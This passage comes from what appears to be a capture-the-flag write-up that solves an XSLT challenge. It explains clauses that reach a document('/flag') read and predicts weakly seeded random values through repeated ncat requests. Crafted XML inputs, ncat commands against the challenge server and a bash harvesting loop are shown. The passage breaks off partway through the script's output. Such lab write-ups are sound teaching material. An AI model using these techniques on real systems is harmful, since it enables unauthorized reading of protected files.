target="_blank" rel="noopener">xsl:choose</a></strong>, which is like a <strong>switch-case</strong> from the c language the <strong>when</strong> tags are the case clauses, and it only enters it if the condition is true of course. Right before the <strong>choose</strong> two variables are being initialized, <strong>c</strong> and <strong>r</strong> , the variable <strong>c</strong> will get the head (first element) of the plate list inside the tag course, and <strong>r</strong> will be setted into the <strong>rest</strong> plates of the list, <strong>position()&gt;1</strong> will select all the plates above the position 1.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"count($course) &gt; 0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"c"</span> <span class="attr">select</span>=<span class="string">"$course[1]"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"r"</span> <span class="attr">select</span>=<span class="string">"$course[position()&gt;1]"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:choose</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:when</span> <span class="attr">test</span>=<span class="string">"count($c/宫保鸡丁) = 1"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">chef-drinks</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">chef-drinks</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">drinks</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"$drinks"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"$food-eaten + 1"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"$r"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"$drinks"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">xsl:when</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:when</span> <span class="attr">test</span>=<span class="string">"count($c/paella) = 1"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"newdrinks"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"$c/paella + 0"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"$drinks"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:variable</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"$food-eaten + 1"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"$r"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"exsl:node-set($newdrinks)//value"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">xsl:when</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Clause-Analysis"><a href="#Clause-Analysis" class="headerlink" title="Clause Analysis"></a>Clause Analysis</h3><p>I will only explain 3 clauses, since my solution only uses 3 it makes sense to only explain these ones.</p><p>Analysing the first <strong>case-clause</strong>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:when</span> <span class="attr">test</span>=<span class="string">"count($c/宫保鸡丁) = 1"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>We can already update out XML into this, since <strong>$c</strong> is a plate we will need a new <strong>tag</strong> which are named into this weird names, if we want to enter into this clause:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">宫保鸡丁</span>&gt;</span>4<span class="tag">&lt;/<span class="name">宫保鸡丁</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">drinks</span>&gt;</span></span><br><span class="line">        1</span><br><span class="line">       <span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line"></span><br><span class="line">       <span class="tag">&lt;<span class="name">drinks</span>&gt;</span></span><br><span class="line">        1</span><br><span class="line">       <span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Now analysing the code when we enter this clause 宫保鸡丁 , as we can see below it only prints the current <strong>chef drinks</strong> and the current <strong>drinks</strong>, in the end is recalling <strong>consume-meal</strong>, this will form a recursive function that will iterate all the plates created in the <strong>course</strong> tag, as we can see the parameters passed the only thing that changes is the <strong>$course</strong> the <strong>$r</strong> is passed into this parameter so we don’t get stuck in a infinite loop which is the usually the thing you do when creating a recursive function, oh the other change is obvious the incrementing of the variable <strong>food-eaten</strong>.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:when</span> <span class="attr">test</span>=<span class="string">"count($c/宫保鸡丁) = 1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">chef-drinks</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">chef-drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">drinks</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"$drinks"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:message</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"$food-eaten + 1"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"$r"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"$drinks"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:when</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Analysing the second <strong>case-clause</strong>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:when</span> <span class="attr">test</span>=<span class="string">"count($c/दाल) = 1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:if</span> <span class="attr">test</span>=<span class="string">"count($chef-drinks) = 0"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"document('/flag')"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"$food-eaten + 1"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"$r"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"$drinks"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:when</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Now analysing the code when we enter this clause दाल, we can see it will print and select a document “/flag” which will contain the flag we need, perhaps we need satisfy the condition <strong>count($chef-drinks) = 0</strong>, the <strong>chef-drinks</strong> is initialized with 5 random numbers (chef-drinks) so we need to find a clause that removes items from <strong>$chef-drinks</strong> so we reach the count of 0.</p><p>Analysing the third <strong>case-clause</strong>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:when</span> <span class="attr">test</span>=<span class="string">"count($c/Борщ) = 1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"arg0"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"$drinks[1] + 0"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:variable</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:call-template</span> <span class="attr">name</span>=<span class="string">"consume-meal"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"$chef-drinks[position() &gt; 1 or $chef-drinks[1] != $arg0]"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"food-eaten"</span> <span class="attr">select</span>=<span class="string">"$food-eaten + 1"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"course"</span> <span class="attr">select</span>=<span class="string">"$r"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"drinks"</span> <span class="attr">select</span>=<span class="string">"$drinks[position() &gt; 1]"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:call-template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:when</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Now analysing the code when we enter this clause Борщ, the first drink in $drinks (drinks declared inside the state tag) is setted into arg0 variable, now analysing the recalling parameters we can see <strong>chef-drinks</strong> is being modified:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:with-param</span> <span class="attr">name</span>=<span class="string">"chef-drinks"</span> <span class="attr">select</span>=<span class="string">"$chef-drinks[position() &gt; 1 or $chef-drinks[1] != $arg0]"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>The select will remove the <strong>head</strong> of <strong>$chef-drinks</strong> based on a condition <strong>position() &gt; 1 or $chef-drinks[1] != $arg0</strong>, so to make this condition work we need either for both condition to be both false, or to at least <strong>position() &gt; 1</strong> to be true, unfortunately <strong>position() &gt; 1</strong> will never be true in this situation because <strong>position()</strong> will return the current position order in xml and since it’s not associated into any tag it will always return 1 because is associated to the <strong>root element meal</strong>, <strong>1 &gt; 1</strong> is always false so we need to make <strong>$chef-drinks[1] != $arg0</strong> to return false as well, the <strong>$chef-drinks</strong> are declared as <strong>random</strong> in the begining but as I said before the randomness is implemented in a wrong way, if we do fast requests we can get the same numbers as we can analyse it here:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ncat 35.246.237.11 1 &lt; solution.xml</span><br><span class="line">Reading input document from stdin...</span><br><span class="line">XSLT message: 2790719341256416733922614505473645015994193916258 (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 1, column 1.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">XSLT message:  (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 1, column 1.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;&lt;all/&gt;⏎                                                                          </span><br><span class="line"></span><br><span class="line">$ ncat 35.246.237.11 1 &lt; solution.xml</span><br><span class="line">Reading input document from stdin...</span><br><span class="line">XSLT message: 2790719341256416733922614505473645015994193916258 (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 1, column 1.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">XSLT message:  (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 1, column 1.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;&lt;all/&gt;</span><br></pre></td></tr></table></figure><p>The only <strong>case-clause</strong> that prints the $chef-drinks for us is <strong>宫保鸡丁</strong> , so the xml used to print the samples above was:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">宫保鸡丁</span>&gt;</span>4<span class="tag">&lt;/<span class="name">宫保鸡丁</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>But we ran into a problem here right? as you can see it prints <strong>chef-drinks</strong> into a single number, <strong>2790719341256416733922614505473645015994193916258</strong>, it looks like the message printing is joining all the 5 elements into a one number, for example if the random numbers were <strong>1,2,3,4,5</strong> the number that would be printed is <strong>12345</strong> , the problem is sometimes each drink will have a different length and we don’t have any way to tell which length each element has, so I decided to analyse a lot of occurrences.</p><p>To make sure the length of each <strong>$chef-drink</strong> I decided to modify a little bit the <strong>challenge.min.xslt</strong> file in my docker container so I could print those numbers as well, so right after the declared parameters in <strong>consume-meal</strong> I added this line:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"$chef-drinks"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>So at every iteration of <strong>consumer-meals</strong> the <strong>$chef-drinks</strong> will be printed like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ncat localhost 1337 &lt; solution.xml</span><br><span class="line">Reading input document from stdin...</span><br><span class="line">XSLT message: 993763458325537011481963110810288894381216985659 (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 65, column 65.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">XSLT message:  (Occurred <span class="keyword">in</span> entity <span class="string">'file:///home/user/challenge.min.xslt'</span>, at line 70, column 70.)</span><br><span class="line">Source tree node: meal.</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;&lt;all&gt;&lt;value&gt;993763458&lt;/value&gt;&lt;value&gt;3255370114&lt;/value&gt;&lt;value&gt;819631108&lt;/value&gt;&lt;value&gt;1028889438&lt;/value&gt;&lt;value&gt;1216985659&lt;/value&gt;&lt;value&gt;993763458&lt;/value&gt;&lt;value&gt;3255370114&lt;/value&gt;&lt;value&gt;819631108&lt;/value&gt;&lt;value&gt;1028889438&lt;/value&gt;&lt;value&gt;1216985659&lt;/value&gt;&lt;/all&gt;</span><br></pre></td></tr></table></figure><p>So after this I did this bash script:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##35.246.237.11 1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..1000&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">var1=$(ncat localhost 1337 &lt; solution.xml | grep -Poh <span class="string">'\d&#123;4,&#125;'</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var1</span>;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></p><p>Running it into a file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash rofl.sh &gt; out</span><br></pre></td></tr></table></figure><p>So after saving the outputs into a file I got something like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">1326253109254338424518246198631339281333178972257 1326253109 2543384245 182461986 3133928133 3178972257 1326253109 2543384245 182461986 3133928133 3178972257</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 17631206 3624963120 2364853915 2890537599</span><br><span class="line">72103983017631206362496312023648539152890537599 721039830 17631206 3624963120 2364853915 2890537599 721039830 